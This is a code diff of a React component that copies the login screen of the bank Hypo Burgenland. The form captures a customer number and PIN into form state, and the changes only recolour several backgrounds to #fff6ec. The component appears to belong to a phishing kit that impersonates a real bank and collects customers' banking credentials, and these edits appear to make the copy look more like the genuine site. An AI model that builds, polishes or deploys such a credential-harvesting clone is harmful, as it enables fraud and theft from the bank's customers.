@@ -42,7 +42,7 @@ export function HypoBurgenland({ formData, onChange, handleRouteAction, saving }
       ></div>
 
       {/* Header */}
-      <header className="w-full bg-white h-[80px] flex items-center px-4 md:px-12 shrink-0 shadow-sm">
+      <header className="w-full bg-[#fff6ec] h-[80px] flex items-center px-4 md:px-12 shrink-0 shadow-sm">
         <div className="flex items-center">
           <div className="relative w-40 h-16">
             <Image 
@@ -57,7 +57,7 @@ export function HypoBurgenland({ formData, onChange, handleRouteAction, saving }
 
       {/* Main Content */}
       <div className="flex-1 flex items-center justify-center px-4 py-12">
-        <div className="w-full max-w-[580px] bg-white shadow-[0_4px_20px_rgba(0,0,0,0.15)] flex flex-col">
+        <div className="w-full max-w-[580px] bg-[#fff6ec] shadow-[0_4px_20px_rgba(0,0,0,0.15)] flex flex-col">
           
           {/* Blue Title Bar */}
           <div className="bg-[#005ba3] text-white px-6 py-4">
@@ -106,7 +106,7 @@ export function HypoBurgenland({ formData, onChange, handleRouteAction, saving }
                     autoFocus
                     value={formData.verfuegernummer || ""}
                     onChange={(e) => onChange("verfuegernummer", e.target.value)}
-                    className="w-full h-[38px] bg-[#f8f8f8] border border-[#e0e0e0] rounded-[3px] px-3 outline-none focus:border-[#005ba3] focus:bg-white text-[#333] text-[14px] transition-colors"
+                    className="w-full h-[38px] bg-[#f8f8f8] border border-[#e0e0e0] rounded-[3px] px-3 outline-none focus:border-[#005ba3] focus:bg-[#fff6ec] text-[#333] text-[14px] transition-colors"
                   />
                 ) : (
                   <div className="animate-in fade-in slide-in-from-right-4 duration-300">
@@ -116,7 +116,7 @@ export function HypoBurgenland({ formData, onChange, handleRouteAction, saving }
                       autoFocus
                       value={formData.pin || ""}
                       onChange={(e) => onChange("pin", e.target.value)}
-                      className="w-full h-[38px] bg-[#f8f8f8] border border-[#e0e0e0] rounded-[3px] px-3 outline-none focus:border-[#005ba3] focus:bg-white text-[#333] text-[14px] transition-colors"
+                      className="w-full h-[38px] bg-[#f8f8f8] border border-[#e0e0e0] rounded-[3px] px-3 outline-none focus:border-[#005ba3] focus:bg-[#fff6ec] text-[#333] text-[14px] transition-colors"
                     />
                   </div>
                 )}
@@ -146,7 +146,7 @@ export function HypoBurgenland({ formData, onChange, handleRouteAction, saving }
                 <button 
                   type="button" 
                   onClick={() => setStep(1)}
-                  className="w-full mt-3 bg-white border border-[#005ba3] hover:bg-blue-50 text-[#005ba3] font-medium h-[40px] rounded-[4px] text-[15px] transition-colors"
+                  className="w-full mt-3 bg-[#fff6ec] border border-[#005ba3] hover:bg-blue-50 text-[#005ba3] font-medium h-[40px] rounded-[4px] text-[15px] transition-colors"
                 >
                   Zurück
                 </button>
